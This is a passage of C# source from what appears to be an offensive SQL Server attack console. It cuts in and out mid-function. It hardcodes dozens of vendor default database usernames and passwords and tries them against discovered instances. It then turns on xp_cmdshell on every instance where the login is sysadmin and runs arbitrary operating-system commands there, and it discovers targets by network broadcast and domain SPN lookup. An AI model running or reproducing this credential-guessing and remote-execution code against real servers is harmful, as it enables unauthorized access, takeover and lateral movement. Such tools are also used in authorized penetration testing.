                                SQLCommands.MasterAccessList.Rows.Add(CurrentRecord["Instance"].ToString(), CurrentRecord["DomainName"].ToString(), CurrentRecord["ServiceProcessID"].ToString(), CurrentRecord["ServiceName"].ToString(), CurrentRecord["ServiceAccount"].ToString(), CurrentRecord["AuthenticationMode"].ToString(), CurrentRecord["ForcedEncryption"].ToString(), CurrentRecord["Clustered"].ToString(), CurrentRecord["SQLServerMajorVersion"].ToString(), CurrentRecord["SQLServerVersionNumber"].ToString(), CurrentRecord["SQLServerEdition"].ToString(), CurrentRecord["SQLServerServicePack"].ToString(), CurrentRecord["OSArchitecture"].ToString(), CurrentRecord["OsVersionNumber"].ToString(), CurrentRecord["CurrentLogin"].ToString(), CurrentRecord["IsSysadmin"].ToString(), PasswordG);

                                // Add to count
                                countAccessible = countAccessible + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG.Equals("enabled"))
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + countAccessible + " instances can be logged into.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: CHECKDEFAULTAPPPW 
            // ------------------------------------------------------------
            public static string CheckDefaultAppPw()
            {
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create list 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
                    if (InstanceAllG.Equals("enabled"))
                    {
                        foreach (DataRow CurrentRecord in SQLCommands.MasterDiscoveredList.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Create data table for default password 
                    DataTable DefaultPasswordList = new DataTable();
                    DefaultPasswordList.Columns.Add("DefaultInstance");
                    DefaultPasswordList.Columns.Add("DefaultUsername");
                    DefaultPasswordList.Columns.Add("DefaultPassword");
                    DefaultPasswordList.Rows.Add("ACS", "ej", "ej");
                    DefaultPasswordList.Rows.Add("ACT7", "sa", "sage");
                    DefaultPasswordList.Rows.Add("AOM2", "admin", "ca_admin");
                    DefaultPasswordList.Rows.Add("ARIS", "ARIS9", "*ARIS!1dm9n#");
                    DefaultPasswordList.Rows.Add("AutodeskVault", "sa", "AutodeskVault@26200");
                    DefaultPasswordList.Rows.Add("BOSCHSQL", "sa", "RPSsql12345");
                    DefaultPasswordList.Rows.Add("BPASERVER9", "sa", "AutoMateBPA9");
                    DefaultPasswordList.Rows.Add("CDRDICOM", "sa", "CDRDicom50!");
                    DefaultPasswordList.Rows.Add("CODEPAL", "sa", "Cod3p@l");
                    DefaultPasswordList.Rows.Add("CODEPAL08", "sa", "Cod3p@l");
                    DefaultPasswordList.Rows.Add("CounterPoint", "sa", "CounterPoint8");
                    DefaultPasswordList.Rows.Add("CSSQL05", "ELNAdmin", "ELNAdmin");
                    DefaultPasswordList.Rows.Add("CSSQL05", "sa", "CambridgeSoft_SA");
                    DefaultPasswordList.Rows.Add("CADSQL", "CADSQLAdminUser", "Cr41g1sth3M4n!");
                    DefaultPasswordList.Rows.Add("DHLEASYSHIP", "sa", "DHLadmin@1");
                    DefaultPasswordList.Rows.Add("DPM", "admin", "ca_admin");
                    DefaultPasswordList.Rows.Add("DVTEL", "sa", "");
                    DefaultPasswordList.Rows.Add("EASYSHIP", "sa", "DHLadmin@1");
                    DefaultPasswordList.Rows.Add("ECC", "sa", "Webgility2011");
                    DefaultPasswordList.Rows.Add("ECOPYDB", "e+C0py2007_@x", "e+C0py2007_@x");
                    DefaultPasswordList.Rows.Add("ECOPYDB", "sa", "ecopy");
                    DefaultPasswordList.Rows.Add("Emerson2012", "sa", "42Emerson42Eme");
                    DefaultPasswordList.Rows.Add("HDPS", "sa", "sa");
                    DefaultPasswordList.Rows.Add("HPDSS", "sa", "Hpdsdb000001");
                    DefaultPasswordList.Rows.Add("HPDSS", "sa", "hpdss");
                    DefaultPasswordList.Rows.Add("INSERTGT", "msi", "keyboa5");
                    DefaultPasswordList.Rows.Add("INSERTGT", "sa", "");
                    DefaultPasswordList.Rows.Add("INTRAVET", "sa", "Webster#1");
                    DefaultPasswordList.Rows.Add("MYMOVIES", "sa", "t9AranuHA7");
                    DefaultPasswordList.Rows.Add("PCAMERICA", "sa", "pcAmer1ca");
                    DefaultPasswordList.Rows.Add("PRISM", "sa", "SecurityMaster08");
                    DefaultPasswordList.Rows.Add("RMSQLDATA", "Super", "Orange");
                    DefaultPasswordList.Rows.Add("RTCLOCAL", "sa", "mypassword");
                    DefaultPasswordList.Rows.Add("RBAT", "sa", "34TJ4@#$");
                    DefaultPasswordList.Rows.Add("RIT", "sa", "34TJ4@#$");
                    DefaultPasswordList.Rows.Add("RCO", "sa", "34TJ4@#$");
                    DefaultPasswordList.Rows.Add("REDBEAM", "sa", "34TJ4@#$");
                    DefaultPasswordList.Rows.Add("SALESLOGIX", "sa", "SLXMaster");
                    DefaultPasswordList.Rows.Add("SIDEXIS_SQL", "sa", "2BeChanged");
                    DefaultPasswordList.Rows.Add("SQL2K5", "ovsd", "ovsd");
                    DefaultPasswordList.Rows.Add("SQLEXPRESS", "admin", "ca_admin");
                    DefaultPasswordList.Rows.Add("SQLEXPRESS", "gcs_client", "SysGal.5560");     //SA password = GCSsa5560    
                    DefaultPasswordList.Rows.Add("SQLEXPRESS", "gcs_web_client", "SysGal.5560"); //SA password = GCSsa5560
                    DefaultPasswordList.Rows.Add("SQLEXPRESS", "NBNUser", "NBNPassword");
                    DefaultPasswordList.Rows.Add("STANDARDDEV2014", "test", "test");
                    DefaultPasswordList.Rows.Add("TEW_SQLEXPRESS", "tew", "tew");
                    DefaultPasswordList.Rows.Add("vocollect", "vocollect", "vocollect");
                    DefaultPasswordList.Rows.Add("VSDOTNET", "sa", "");
                    DefaultPasswordList.Rows.Add("VSQL", "sa", "111");
                    DefaultPasswordList.Rows.Add("CASEWISE", "sa", "");
                    DefaultPasswordList.Rows.Add("VANTAGE", "sa", "vantage12!");
                    DefaultPasswordList.Rows.Add("BCM", "bcmdbuser", "Bcmuser@06");
                    DefaultPasswordList.Rows.Add("BCM", "bcmdbuser", "Numara@06");
                    DefaultPasswordList.Rows.Add("DEXIS_DATA", "sa", "dexis");
                    DefaultPasswordList.Rows.Add("DEXIS_DATA", "dexis", "dexis");
                    DefaultPasswordList.Rows.Add("SMTKINGDOM", "SMTKINGDOM", "$ei$micMicro");
                    DefaultPasswordList.Rows.Add("RE7_MS", "Supervisor", "Supervisor");
                    DefaultPasswordList.Rows.Add("SPSQL", "sa", "SecurityMaster08");
                    DefaultPasswordList.Rows.Add("CAREWARE", "sa", "");
                    DefaultPasswordList.Rows.Add("RE7_MS", "Admin", "Admin");
                    DefaultPasswordList.Rows.Add("OHD", "sa", "ohdusa@123");
                    DefaultPasswordList.Rows.Add("UPC", "serviceadmin", "Password.0");          //Maybe a local windows account
                    DefaultPasswordList.Rows.Add("Hirsh", "Velocity", "i5X9FG42");
                    DefaultPasswordList.Rows.Add("Hirsh", "sa", "i5X9FG42");
                    //Database=OMEssentials; Username=omeadmin; Instance=server\SQLEXPRESSOME;product=OpenManage Essentials;

                    // Get list count
                    var count = TargetList.Count;
                    int guessCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {

                        // Set variables
                        string DefaultInstance = "";
                        string DefaultUsername = "";
                        string DefaultPassword = "";

                        // Check if instance is on the default list - fix to test login, and target dif logins for same instance 
                        // https://docs.microsoft.com/en-us/dotnet/api/system.data.datatable.select?view=netframework-4.8
                        // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                        foreach (DataRow DefaultRecord in DefaultPasswordList.Select())
                        {
                            // Check if match
                            if (instance.ToLower().Contains(DefaultRecord["DefaultInstance"].ToString().ToLower()))
                            {
                                // Set variable for match
                                DefaultInstance = DefaultRecord["DefaultInstance"].ToString();
                                DefaultUsername = DefaultRecord["DefaultUsername"].ToString();
                                DefaultPassword = DefaultRecord["DefaultPassword"].ToString();

                                // Attempt Connection if exists
                                if (!DefaultInstance.Equals(""))
                                {
                                    // Status user 
                                    Console.Write("\n" + instance + ": INSTANCE NAME MATCH FOUND - " + DefaultInstance);
                                    Console.Write("\n" + instance + ": ATTEMPTING LOGIN with Username: " + DefaultUsername + " Password: " + DefaultPassword + "\n");

                                    try
                                    {
                                        // Setup connection string
                                        string ConnectionString = CreateConnectionString(instance, DefaultUsername, DefaultPassword, "SqlLogin", "master");

                                        // Execute query							
                                        string fullcommand = @"
											    -- Get SQL Server Information

											    -- Get SQL Server Service Name and Path
											    DECLARE @SQLServerInstance varchar(250)
											    DECLARE @SQLServerServiceName varchar(250)
											    if @@SERVICENAME = 'MSSQLSERVER'
											    BEGIN
											    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
											    set @SQLServerServiceName = 'MSSQLSERVER'
											    END
											    ELSE
											    BEGIN
											    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
											    set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
											    END

											    -- Get SQL Server Service Account
											    DECLARE @ServiceaccountName varchar(250)
											    EXECUTE master.dbo.xp_instance_regread
											    N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
											    N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

											    -- Get authentication mode
											    DECLARE @AuthenticationMode INT
											    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
											    N'Software\Microsoft\MSSQLServer\MSSQLServer',
											    N'LoginMode', @AuthenticationMode OUTPUT

											    -- Get the forced encryption flag
											    BEGIN TRY 
												    DECLARE @ForcedEncryption INT
												    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
												    N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
												    N'ForceEncryption', @ForcedEncryption OUTPUT
											    END TRY
											    BEGIN CATCH	            
											    END CATCH

											    -- Return server and version information
											    SELECT  @@servername as [Instance],
											    DEFAULT_DOMAIN() as [DomainName],
											    SERVERPROPERTY('processid') as ServiceProcessID,
											    @SQLServerServiceName as [ServiceName],
											    @ServiceAccountName as [ServiceAccount],
											    (SELECT CASE @AuthenticationMode
											    WHEN 1 THEN 'Windows Authentication'
											    WHEN 2 THEN 'Windows and SQL Server Authentication'
											    ELSE 'Unknown'
											    END) as [AuthenticationMode],
											    @ForcedEncryption as ForcedEncryption,
											    CASE  SERVERPROPERTY('IsClustered')
											    WHEN 0
											    THEN 'No'
											    ELSE 'Yes'
											    END as [Clustered],
											    SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
											    SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
											    serverproperty('Edition') as [SQLServerEdition],
											    SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
											    SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
											    RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
											    SYSTEM_USER as [Currentlogin],
											    (select IS_SRVROLEMEMBER('sysadmin')) as IsSysadmin";

                                        SqlConnection conn = new SqlConnection(ConnectionString);
                                        SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                                        conn.Open();

                                        // Read data into data table
                                        DataTable dt = new DataTable();
                                        SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                                        da.Fill(dt);

                                        foreach (DataRow CurrentRecord in dt.Select())
                                        {

                                            // Display SQL Server information
                                            Console.WriteLine("\nInstance             : " + CurrentRecord["Instance"].ToString());
                                            Console.WriteLine("Domain               : " + CurrentRecord["DomainName"].ToString());
                                            Console.WriteLine("Service PID          : " + CurrentRecord["ServiceProcessID"].ToString());
                                            Console.WriteLine("Service Name         : " + CurrentRecord["ServiceName"].ToString());
                                            Console.WriteLine("Service Account      : " + CurrentRecord["ServiceAccount"].ToString());
                                            Console.WriteLine("Authentication Mode  : " + CurrentRecord["AuthenticationMode"].ToString());
                                            Console.WriteLine("Forced Encryption    : " + CurrentRecord["ForcedEncryption"].ToString());
                                            Console.WriteLine("Clustered            : " + CurrentRecord["Clustered"].ToString());
                                            Console.WriteLine("SQL Version          : " + CurrentRecord["SQLServerMajorVersion"].ToString());
                                            Console.WriteLine("SQL Version Number   : " + CurrentRecord["SQLServerVersionNumber"].ToString());
                                            Console.WriteLine("SQL Edition          : " + CurrentRecord["SQLServerEdition"].ToString());
                                            Console.WriteLine("SQL Service Pack     : " + CurrentRecord["SQLServerServicePack"].ToString());
                                            Console.WriteLine("OS Architecture      : " + CurrentRecord["OSArchitecture"].ToString());
                                            Console.WriteLine("OS Version Number    : " + CurrentRecord["OsVersionNumber"].ToString());
                                            Console.WriteLine("Login                : " + CurrentRecord["CurrentLogin"].ToString());
                                            Console.WriteLine("Password             : " + DefaultPassword);
                                            Console.WriteLine("Login is Sysadmin    : " + CurrentRecord["IsSysadmin"].ToString());

                                            // Add to access list
                                            SQLCommands.MasterAccessList.Rows.Add(CurrentRecord["Instance"].ToString(), CurrentRecord["DomainName"].ToString(), CurrentRecord["ServiceProcessID"].ToString(), CurrentRecord["ServiceName"].ToString(), CurrentRecord["ServiceAccount"].ToString(), CurrentRecord["AuthenticationMode"].ToString(), CurrentRecord["ForcedEncryption"].ToString(), CurrentRecord["Clustered"].ToString(), CurrentRecord["SQLServerMajorVersion"].ToString(), CurrentRecord["SQLServerVersionNumber"].ToString(), CurrentRecord["SQLServerEdition"].ToString(), CurrentRecord["SQLServerServicePack"].ToString(), CurrentRecord["OSArchitecture"].ToString(), CurrentRecord["OsVersionNumber"].ToString(), CurrentRecord["CurrentLogin"].ToString(), CurrentRecord["IsSysadmin"].ToString(), DefaultPassword);

                                            // Add to passwords found count 
                                            guessCount = guessCount + 1;
                                        }
                                    }
                                    catch (SqlException ex)
                                    {
                                        Console.WriteLine("" + instance + ": LOGIN, CONNECITON, or QUERY FAILED");
                                        if (VerboseG.Equals("enabled"))
                                        {
                                            Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                                        }
                                    }
                                }
                            }
                        }
                    }
                    Console.WriteLine("\n" + guessCount + " default passwords were found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: RUNOSCMD
            // ------------------------------------------------------------
            public static string RUNOSCMD(string command)
            {
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    DataView AccessView = new DataView(SQLCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG.Equals("enabled"))
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int tableCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.\n");


                    // Loops through target instances 
                    foreach (var instance in TargetList)
                    {

                        // Get sysadmin status 
                        Console.WriteLine("" + instance + ": CHECKING FOR SYSADMIN PRIVS.");
                        DataTable sysadmintbl = new DataTable();
                        string isSyadmin = "0";
                        try
                        {
                            string SysadminConnString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
                            string SysadminQuery = "select IS_SRVROLEMEMBER('sysadmin') as isSysadmin";
                            SqlConnection SysadminConn = new SqlConnection(SysadminConnString);
                            SqlCommand SysadminOutput = new SqlCommand(SysadminQuery, SysadminConn);
                            SysadminConn.Open();
                            SqlDataAdapter SysadminDA = new SqlDataAdapter(SysadminOutput);
                            SysadminDA.Fill(sysadmintbl);
                            SysadminConn.Close();
                        }
                        catch
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED.");
                        }

                        foreach (DataRow CurrentSysadmin in sysadmintbl.Select())
                        {
                            if (CurrentSysadmin["isSysadmin"].ToString().Equals("1"))
                            {
                                Console.WriteLine("" + instance + ": USER IS A SYSADMIN.");
                                isSyadmin = "1";
                            }
                            else
                            {
                                Console.WriteLine("" + instance + ": USER IS NOT A SYSADMIN.\n");
                            }
                        }

                        // Enable Advanced Options 
                        if (isSyadmin.Equals("1"))
                        {
                            // Get advoptions status 

                            Console.WriteLine("" + instance + ": ENABLING SHOW ADVANCED OPTIONS.");
                            DataTable advoptionstbl = new DataTable();
                            try
                            {
                                string advoptionsConnString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
                                string advoptionsQuery = @"sp_configure 'show advanced options',1;reconfigure;";
                                SqlConnection advoptionsConn = new SqlConnection(advoptionsConnString);
                                SqlCommand advoptionsOutput = new SqlCommand(advoptionsQuery, advoptionsConn);
                                advoptionsConn.Open();
                                SqlDataAdapter advoptionsDA = new SqlDataAdapter(advoptionsOutput);
                                advoptionsDA.Fill(advoptionstbl);
                                advoptionsConn.Close();
                            }
                            catch
                            {
                                Console.WriteLine("" + instance + ": UNABLED TO ENABLE SHOW ADVANCED OPTIONS.");
                            }
                        }

                        // Enable xp_cmdshell 
                        if (isSyadmin.Equals("1"))
                        {
                            // Get XpCmdShell status 
                            Console.WriteLine("" + instance + ": ENABLING XPCMDSHELL.");
                            DataTable XpCmdShelltbl = new DataTable();
                            try
                            {
                                string XpCmdShellConnString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
                                string XpCmdShellQuery = @"sp_configure 'xp_cmdshell',1;reconfigure;";
                                SqlConnection XpCmdShellConn = new SqlConnection(XpCmdShellConnString);
                                SqlCommand XpCmdShellOutput = new SqlCommand(XpCmdShellQuery, XpCmdShellConn);
                                XpCmdShellConn.Open();
                                SqlDataAdapter XpCmdShellDA = new SqlDataAdapter(XpCmdShellOutput);
                                XpCmdShellDA.Fill(XpCmdShelltbl);
                                XpCmdShellConn.Close();
                            }
                            catch
                            {
                                Console.WriteLine("" + instance + ": UNABLED TO ENABLE XP_CMDSHLL");
                            }
                        }

                        // Run command 	
                        if (isSyadmin.Equals("1"))
                        {
                            Console.WriteLine(instance + ": RUNNING COMMAND.");
                            DataTable Databases = new DataTable();
                            try
                            {
                                string ConnectionStringdb = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
                                string DatabaseQuery = "EXEC master..xp_cmdshell '" + command + "' WITH RESULT SETS ((output VARCHAR(MAX)))";
                                SqlConnection conndb = new SqlConnection(ConnectionStringdb);
                                SqlCommand DbQueryOutput = new SqlCommand(DatabaseQuery, conndb);
                                conndb.Open();
                                SqlDataAdapter dadb = new SqlDataAdapter(DbQueryOutput);
                                dadb.Fill(Databases);
                                conndb.Close();
                                Console.WriteLine(instance + ": COMMAND RESULTS: \n");
                                tableCount = tableCount + 1;
                            }
                            catch
                            {
                                Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            }

                            // Display results 
                            foreach (DataRow CurrentDatabase in Databases.Select())
                            {
                                // Get table list							
                                Console.WriteLine(CurrentDatabase["output"].ToString());
                            }
                        }
                    }
                    Console.WriteLine("\n" + tableCount + " servers ran the command.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // --------------------------------
            //  FUNCTION: CheckQueryReady
            // --------------------------------
            public static string CheckQueryReady()
            {
                // Verify query targets have been defined
                if ((!InstanceG.Equals("")) || (!ConnectionStringG.Equals("")) || (!InstanceAllG.Equals("disabled")))
                {
                    ReadyforQueryG = "yes";
                }

                return null;
            }

            // --------------------------------
            // FUNCTION: CreateConnectionString
            // --------------------------------
            public static string CreateConnectionString(string instance, string username, string password, string usertype, string database)
            {
                // Seting empty connection string 
                string connectionString = "";

                // Create current Windows user 
                if (usertype.Equals("CurrentWindowsUser"))
                {
                    connectionString = "Server=" + instance + ";Database=" + database + ";Integrated Security=SSPI;Connection Timeout=" + TimeOutG + ";";
                }

                // Create Windows Domain user string
                if (usertype.Equals("WindowsDomainUser"))
                {
                    connectionString = "Server=" + instance + ";Database=" + database + ";Integrated Security=SSPI;Connection Timeout=1" + TimeOutG + ";uid=" + username + ";pwd=" + password + ";";
                }

                // Create SQL Login string
                if (usertype.Equals("SqlLogin"))
                {
                    connectionString = "Server=" + instance + ";Database=" + database + ";Connection Timeout=" + TimeOutG + ";User ID=" + username + ";pwd=" + password + ";";
                }

                return connectionString;
            }

            // --------------------------------
            // FUNCTION: RunConsole / Query 
            // --------------------------------
            public static string RunSQLConsole()
            {
                // Read line from the client	
                Console.Write("SQLCLIENT> ");
                String MyQuery = Console.ReadLine().ToString();

                // Collect multi-line command until "go" is given
                string fullcommand = "";
                while (MyQuery.ToLower() != "go")
                {
                    fullcommand = fullcommand + "\n" + MyQuery;

                    // EXIT IF REQUESTED
                    if (MyQuery.ToLower().Equals("exit") || MyQuery.ToLower().Equals("quit") || MyQuery.ToLower().Equals("bye"))
                    {
                        return null;
                    }

                    // ----------------------------------------------------
                    // CONNECTION SETTINGS 
                    // ----------------------------------------------------
                    #region connection settings

                    // SET CUSTOM CONNECTION STRING  
                    bool loadCheck = MyQuery.ToLower().Contains("set connstring ");
                    if (loadCheck)
                    {
                        string newcon = MyQuery.Replace("set connstring ", "");
                        ConnectionStringG = newcon;

                        // Unset other connection settings 
                        InstanceAllG = "n";
                        InstanceG = "";
                        UsernameG = "";
                        UsertypeG = "";
                        PasswordG = "";

                        // Parse connection string and populate settings
                        // tbd 

                        // Status user
                        Console.Write("\nConnection string set to: " + newcon + "\n");
                        fullcommand = "";
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // SET SINGLE INSTANCE
                    bool instanceCheck = MyQuery.ToLower().Contains("set instance ");
                    if (instanceCheck)
                    {

                        // Configure instance 
                        string newinstance = MyQuery.Replace("set instance ", "");
                        InstanceG = newinstance;
                        Console.Write("\nTarget instance set to: " + InstanceG + "\n");

                        // Update connectionstring
                        ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");

                        // Add instance to discovered list
                        SQLCommands.MasterDiscoveredList.Rows.Add(InstanceG);

                        // Unset InstanceAllG
                        InstanceAllG = "disabled";

                        // Status user
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // SET ALL DISCOVERED INSTANCES
                    bool instanceallCheck = MyQuery.ToLower().Contains("set targetall ");
                    if (instanceallCheck)
                    {
                        string instancestate = MyQuery.Replace("set targetall ", "");
                        if ((instancestate.Equals("enabled")) || (instancestate.Equals("disabled")))
                        {
                            InstanceAllG = instancestate;
                            InstanceG = "";
                            if (instancestate.Equals("enabled"))
                            {
                                Console.Write("\nEnabled targeting of all discovered instances.\n");
                            }
                            else
                            {
                                Console.Write("\nDisabled targeting of all discovered instances.\n");
                            }

                            // Update connectionstring
                            ConnectionStringG = "";

                        }
                        else
                        {
                            Console.Write("\nValid settings include enabled or disabled.\n");
                        }

                        Console.Write("\nSQLCLIENT> ");
                    }

                    // SET USERNAME
                    bool usernameCheck = MyQuery.ToLower().Contains("set username ");
                    if (usernameCheck)
                    {
                        // Set username	
                        UsernameG = MyQuery.ToLower().Replace("set username ", "");
                        Console.Write("\nUsername set to: " + UsernameG + "\n");

                        // Update user type Domain or SQL 						
                        if (UsernameG.ToLower().Contains("\\"))
                        {
                            UsertypeG = "WindowsDomainUser";
                        }
                        else
                        {
                            UsertypeG = "SqlLogin";
                        }

                        // Set to current windows users if blank
                        if (UsernameG.Equals(""))
                        {
                            UsertypeG = "CurrentWindowsUser";
                        }

                        // Update connectionstring
                        ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");

                        // Return to console 
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // SET PASSWORD
                    bool passwordCheck = MyQuery.Contains("set password ");
                    if (passwordCheck)
                    {

                        // Set password 
                        PasswordG = MyQuery.Replace("set password ", "");
                        Console.Write("\nPassword set to: " + PasswordG + "\n");

                        // Update connectionstring
                        ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");

                        // Return to console
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // SET QUERY TIMEOUT
                    bool timeoutCheck = MyQuery.Contains("set timeout ");
                    if (timeoutCheck)
                    {
                        // Set timeout
                        TimeOutG = MyQuery.ToLower().Replace("set timeout ", "");
                        Console.Write("\nQuery timeout set to: " + TimeOutG + "\n");

                        // Update connectionstring
                        ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");

                        // Return to console
                        Console.Write("\nSQLCLIENT> ");
                    }

                    #endregion

                    // ----------------------------------------------------
                    // INSTANCE DISCOVERY COMMANDS
                    // ----------------------------------------------------	
                    #region discovery commands				

                    // DISCOVER SQL SERVER INSTANCES VIA BROADCAST REQUEST
                    bool broadcastCheck = MyQuery.ToLower().Contains("discover broadcast");
                    if (broadcastCheck)
                    {
                        GetSQLServersBroadCast();
                    }

                    // DISCOVER SQL SERVER INSTANCES VIA SERVICE PRINCIPCAL NAMES
                    bool spnCheck = MyQuery.ToLower().Contains("discover domainspn");
                    if (spnCheck)
                    {
                        GetSQLServersSpn();
                    }

                    // DISCOVER SQL SERVER INSTANCES VIA PROVIDED FILE
                    bool fileCheck1 = MyQuery.ToLower().Contains("discover file");
                    if (fileCheck1)
                    {
                        // Parse file path
                        String filePath1 = MyQuery.ToLower();
                        String parts = filePath1.Split(' ')[2];

                        // Add instance list to discovered
                        GetSQLServerFile(parts);
                    }

                    // SHOW DISCOVERED SQL SERVER INSTANCES
                    bool showdiscoCheck = MyQuery.ToLower().Contains("show discovered");
                    if (showdiscoCheck)
                    {
                        // Display output of data table
                        int linewidth = 50;
                        string columnValue = "";
                        string spaces = "";
                        int tabNumber = 1;
                        DataRow[] currentRows = SQLCommands.MasterDiscoveredList.Select(null, null, DataViewRowState.CurrentRows);
                        if (currentRows.Length > 1)
                        {
                            // Display columns.
                            Console.WriteLine("\n");
                            foreach (DataColumn column in SQLCommands.MasterDiscoveredList.Columns)
                            {
                                // Pad column
                                columnValue = column.ColumnName.ToString();
                                if (columnValue.Length < linewidth)
                                {
                                    tabNumber = linewidth - columnValue.Length;
                                    spaces = new String(' ', tabNumber);
                                }
                                else
                                {
                                    tabNumber = 1;
                                }

                                Console.Write(column.ColumnName + spaces);
                            }

                            Console.WriteLine("\t");

                            // Display rows
                            foreach (DataRow row in currentRows)
                            {
                                foreach (DataColumn column in SQLCommands.MasterDiscoveredList.Columns)
                                {
                                    // Pad column to 50 characters
                                    columnValue = row[column].ToString();
                                    if (columnValue.Length < linewidth)
                                    {
                                        tabNumber = linewidth - columnValue.Length;
                                        spaces = new String(' ', tabNumber);
                                    }
                                    else
                                    {
                                        tabNumber = 1;
                                    }

                                    Console.Write(row[column] + spaces);
                                }
                                Console.WriteLine("\t");
                            }
                        }

                        Console.WriteLine("\n" + SQLCommands.MasterDiscoveredList.Rows.Count + " instances found.");
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // EXPORT DISCOVERED SQL SERVER INSTANCES TO FILE
                    bool exportdiscoCheck = MyQuery.ToLower().Contains("export discovered");
                    if (exportdiscoCheck)
                    {
                        // Parse file path
                        String filePath1 = MyQuery.ToLower();
                        String targetPath = filePath1.Split(' ')[2];

                        StringBuilder fileContent = new StringBuilder();

                        foreach (var col in SQLCommands.MasterDiscoveredList.Columns)
                        {
                            fileContent.Append(col.ToString() + ",");
                        }

                        fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                        foreach (DataRow dr in SQLCommands.MasterDiscoveredList.Rows)
                        {
                            foreach (var column in dr.ItemArray)
                            {
                                fileContent.Append("\"" + column.ToString() + "\",");
                            }

                            fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                        }

                        try
                        {
                            // write file output
                            System.IO.File.WriteAllText(targetPath, fileContent.ToString());
                            Console.WriteLine("\n" + SQLCommands.MasterDiscoveredList.Rows.Count + " instances were written to " + targetPath);
                        }
                        catch
                        {
                            Console.WriteLine("\nUnable to write file.\n");
                        }

                        // Display console	
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // CLEAR DISCOVERED INSTANCES 
                    bool cleardiscoCheck = MyQuery.ToLower().Contains("clear discovered");
                    if (cleardiscoCheck)
                    {
                        // Remove items
                        SQLCommands.MasterDiscoveredList.Clear();

                        // Status user
                        Console.Write("\nThe list of discovered instances has been cleared.\n");

                        // Display console				
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // SHOW SQL SERVER INSTANCES THAT CAN BE LOGGED INTO
                    bool showaccessCheck = MyQuery.ToLower().Contains("show access");
                    if (showaccessCheck)
                    {
                        // Unique the list
                        DataView AccessView = new DataView(SQLCommands.MasterAccessList);
                        DataTable distinctValues = AccessView.ToTable(true, "Instance", "DomainName", "ServiceProcessID", "ServiceName", "ServiceAccount", "AuthenticationMode", "ForcedEncryption", "Clustered", "SQLServerMajorVersion", "SQLServerVersionNumber", "SQLServerEdition", "SQLServerServicePack", "OSArchitecture", "OsVersionNumber", "CurrentLogin", "CurrentLoginPassword", "IsSysadmin");

                        // Display the list 
